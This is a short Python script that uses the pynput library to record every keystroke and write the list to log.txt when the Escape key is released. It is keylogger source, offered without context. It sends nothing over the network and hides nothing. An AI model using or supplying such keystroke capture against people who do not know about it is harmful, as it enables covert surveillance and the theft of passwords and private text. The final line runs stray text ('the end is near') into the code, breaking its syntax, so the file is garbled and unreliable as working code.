from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)

def on_release(key):
    if key==Key.esc:
        with open('log.txt','w') as file:
            file.writelines(str(keys))
        return False
    
with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()>the end is near